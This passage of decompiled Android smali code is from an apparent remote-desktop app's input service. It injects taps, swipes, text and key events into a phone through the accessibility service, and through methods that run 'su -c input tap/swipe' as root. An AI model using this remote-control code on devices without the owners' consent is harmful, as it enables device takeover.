    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string p3, ", error:"

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_ba
    :goto_ba
    return-void
.end method

.method public final q(II)V
    .registers 5

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_13

    const/4 v0, 0x0

    invoke-virtual {p0, p1, p2, v0}, Lcom/carriez/flutter_hbb/InputService;->p(IIZ)V

    iget-object p1, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    invoke-virtual {p1}, Landroid/graphics/Path;->reset()V

    const/4 p1, 0x0

    iput-object p1, p0, Lcom/carriez/flutter_hbb/InputService;->k:Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    goto :goto_16

    :cond_13
    invoke-virtual {p0, p1, p2}, Lcom/carriez/flutter_hbb/InputService;->r(II)V

    :goto_16
    return-void
.end method

.method public final r(II)V
    .registers 12

    :try_start_0
    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    int-to-float v1, p1

    int-to-float v2, p2

    invoke-virtual {v0, v1, v2}, Landroid/graphics/Path;->lineTo(FF)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p0, Lcom/carriez/flutter_hbb/InputService;->l:J

    sub-long/2addr v0, v2

    const-wide/16 v2, 0x50

    cmp-long v4, v0, v2

    if-gez v4, :cond_16

    const-wide/16 v0, 0x50

    :cond_16
    new-instance v8, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    iget-object v3, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    const-wide/16 v4, 0x0

    move-object v2, v8

    move-wide v6, v0

    invoke-direct/range {v2 .. v7}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    new-instance v2, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v2}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    invoke-virtual {v2, v8}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    iget-object v3, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "end gesture x:"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, " y:"

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, " time:"

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v2}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p1

    const/4 p2, 0x0

    invoke-virtual {p0, p1, p2, p2}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z
    :try_end_57
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_57} :catch_58

    goto :goto_6f

    :catch_58
    move-exception p1

    iget-object p2, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "endGesture error:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :goto_6f
    return-void
.end method

.method public final s(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .registers 9

    const/4 v0, 0x0

    if-nez p1, :cond_4

    return-object v0

    :cond_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    move-result v1

    if-eqz v1, :cond_11

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocusable()Z

    move-result v1

    if-eqz v1, :cond_11

    return-object p1

    :cond_11
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    const/4 v2, 0x0

    const/4 v3, 0x0

    :goto_17
    const/16 v4, 0x21

    if-ge v3, v1, :cond_38

    invoke-virtual {p1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_35

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    move-result v6

    if-eqz v6, :cond_2e

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocusable()Z

    move-result v6

    if-eqz v6, :cond_2e

    return-object v5

    :cond_2e
    sget v6, Landroid/os/Build$VERSION;->SDK_INT:I

    if-ge v6, v4, :cond_35

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    :cond_35
    add-int/lit8 v3, v3, 0x1

    goto :goto_17

    :cond_38
    :goto_38
    if-ge v2, v1, :cond_57

    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_54

    invoke-virtual {p0, v3}, Lcom/carriez/flutter_hbb/InputService;->s(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    sget v6, Landroid/os/Build$VERSION;->SDK_INT:I

    if-ge v6, v4, :cond_51

    invoke-static {v3, v5}, Ln7/j;->a(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_51

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    :cond_51
    if-eqz v5, :cond_54

    return-object v5

    :cond_54
    add-int/lit8 v2, v2, 0x1

    goto :goto_38

    :cond_57
    return-object v0
.end method

.method public final t()Le4/d0;
    .registers 2

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->x:Lkotlin/Lazy;

    invoke-interface {v0}, Lkotlin/Lazy;->getValue()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Le4/d0;

    return-object v0
.end method

.method public final u(Ljava/util/LinkedList;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .registers 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/LinkedList<",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            ">;",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            ")V"
        }
    .end annotation

    if-nez p2, :cond_3

    return-void

    :cond_3
    invoke-virtual {p1, p2}, Ljava/util/LinkedList;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    return-void

    :cond_a
    invoke-virtual {p1, p2}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    return-void
.end method

.method public final v(II)V
    .registers 5

    iget-wide v0, p0, Lcom/carriez/flutter_hbb/InputService;->q:J

    invoke-virtual {p0, p1, p2, v0, v1}, Lcom/carriez/flutter_hbb/InputService;->C(IIJ)V

    return-void
.end method

.method public final w()V
    .registers 4

    sget-object v0, Lcom/carriez/flutter_hbb/InputService;->y:Lcom/carriez/flutter_hbb/InputService$a;

    invoke-virtual {v0}, Lcom/carriez/flutter_hbb/InputService$a;->b()Z

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Le4/n;

    invoke-direct {v2, v0}, Le4/n;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public final y([B)V
    .registers 8

    const-string v0, "data"

    invoke-static {p1, v0}, Ln7/j;->e(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {p1}, Lz5/f;->W([B)Lz5/f;

    move-result-object p1

    invoke-virtual {p1}, Lz5/f;->P()Lz5/g;

    move-result-object v0

    new-instance v1, Ln7/q;

    invoke-direct {v1}, Ln7/q;-><init>()V

    invoke-virtual {p1}, Lz5/f;->V()Z

    move-result v2

    if-eqz v2, :cond_1f

    invoke-virtual {p1}, Lz5/f;->S()Ljava/lang/String;

    move-result-object v0

    iput-object v0, v1, Ln7/q;->h:Ljava/lang/Object;

    goto :goto_49

    :cond_1f
    sget-object v2, Lz5/g;->i:Lz5/g;

    if-ne v0, v2, :cond_49

    invoke-virtual {p1}, Lz5/f;->T()Z

    move-result v0

    if-eqz v0, :cond_49

    invoke-virtual {p1}, Lz5/f;->O()Z

    move-result v0

    if-nez v0, :cond_35

    invoke-virtual {p1}, Lz5/f;->R()Z

    move-result v0

    if-eqz v0, :cond_49

    :cond_35
    invoke-virtual {p1}, Lz5/f;->M()I

    move-result v0

    invoke-static {v0}, Ljava/lang/Character;->toChars(I)[C

    move-result-object v0

    const-string v2, "toChars(...)"

    invoke-static {v0, v2}, Ln7/j;->d(Ljava/lang/Object;Ljava/lang/String;)V

    new-instance v2, Ljava/lang/String;

    invoke-direct {v2, v0}, Ljava/lang/String;-><init>([C)V

    iput-object v2, v1, Ln7/q;->h:Ljava/lang/Object;

    :cond_49
    :goto_49
    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "onKeyEvent "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, " textToCommit:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, v1, Ln7/q;->h:Ljava/lang/Object;

    check-cast v3, Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ln7/q;

    invoke-direct {v0}, Ln7/q;-><init>()V

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x21

    if-lt v2, v3, :cond_7a

    iget-object v4, v1, Ln7/q;->h:Ljava/lang/Object;

    if-nez v4, :cond_85

    :cond_7a
    sget-object v4, Lz5/a;->a:Lz5/a;

    invoke-static {p1}, Ln7/j;->b(Ljava/lang/Object;)V

    invoke-virtual {v4, p1}, Lz5/a;->d(Lz5/f;)Landroid/view/KeyEvent;

    move-result-object v4

    iput-object v4, v0, Ln7/q;->h:Ljava/lang/Object;

    :cond_85
    iget-object v4, v0, Ln7/q;->h:Ljava/lang/Object;

    check-cast v4, Landroid/view/KeyEvent;

    if-eqz v4, :cond_99

    invoke-virtual {p0, v4}, Lcom/carriez/flutter_hbb/InputService;->G(Landroid/view/KeyEvent;)Z

    move-result v5

    if-eqz v5, :cond_92

    return-void

    :cond_92
    invoke-virtual {p0, v4}, Lcom/carriez/flutter_hbb/InputService;->F(Landroid/view/KeyEvent;)Z

    move-result v4

    if-eqz v4, :cond_99

    return-void

    :cond_99
    if-lt v2, v3, :cond_d1

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getInputMethod()Landroid/accessibilityservice/InputMethod;

    move-result-object v2

    if-eqz v2, :cond_e2

    invoke-virtual {v2}, Landroid/accessibilityservice/InputMethod;->getCurrentInputConnection()Landroid/accessibilityservice/InputMethod$AccessibilityInputConnection;

    move-result-object v2

    if-eqz v2, :cond_e2

    iget-object v1, v1, Ln7/q;->h:Ljava/lang/Object;

    const/4 v3, 0x1

    if-eqz v1, :cond_b5

    check-cast v1, Ljava/lang/String;

    if-eqz v1, :cond_e2

    const/4 p1, 0x0

    invoke-virtual {v2, v1, v3, p1}, Landroid/accessibilityservice/InputMethod$AccessibilityInputConnection;->commitText(Ljava/lang/CharSequence;ILandroid/view/inputmethod/TextAttribute;)V

    goto :goto_e2

    :cond_b5
    iget-object v0, v0, Ln7/q;->h:Ljava/lang/Object;

    check-cast v0, Landroid/view/KeyEvent;

    if-eqz v0, :cond_e2

    invoke-virtual {v2, v0}, Landroid/accessibilityservice/InputMethod$AccessibilityInputConnection;->sendKeyEvent(Landroid/view/KeyEvent;)V

    invoke-virtual {p1}, Lz5/f;->R()Z

    move-result p1

    if-eqz p1, :cond_e2

    new-instance p1, Landroid/view/KeyEvent;

    invoke-virtual {v0}, Landroid/view/KeyEvent;->getKeyCode()I

    move-result v0

    invoke-direct {p1, v3, v0}, Landroid/view/KeyEvent;-><init>(II)V

    invoke-virtual {v2, p1}, Landroid/accessibilityservice/InputMethod$AccessibilityInputConnection;->sendKeyEvent(Landroid/view/KeyEvent;)V

    goto :goto_e2

    :cond_d1
    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v3, Le4/o;

    invoke-direct {v3, v0, p0, v1, p1}, Le4/o;-><init>(Ln7/q;Lcom/carriez/flutter_hbb/InputService;Ln7/q;Lz5/f;)V

    invoke-virtual {v2, v3}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :cond_e2
    :goto_e2
    return-void
.end method

.method public static final injectRootTap(II)V
    .registers 7

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "input tap "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "input service"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Executing root tap: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "/system/bin/su"

    aput-object v3, v1, v2

    const/4 v2, 0x1

    const-string v3, "-c"

    aput-object v3, v1, v2

    const/4 v2, 0x2

    aput-object v0, v1, v2

    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_end_30
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_30} :catch_31

    goto :goto_39

    :catch_31
    move-exception v0

    const-string v1, "input service"

    const-string v2, "injectRootTap exception: "

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_39
    return-void
.end method

.method public static final injectRootSwipe(IIII)V
    .registers 9

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "input swipe "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " 100"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "input service"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Executing root swipe: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "/system/bin/su"

    aput-object v3, v1, v2

    const/4 v2, 0x1

    const-string v3, "-c"

    aput-object v3, v1, v2

    const/4 v2, 0x2

    aput-object v0, v1, v2

    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_end_30
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_30} :catch_31

    goto :goto_39

    :catch_31
    move-exception v0

    const-string v1, "input service"

    const-string v2, "injectRootSwipe exception: "

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_39
    return-void
.end method

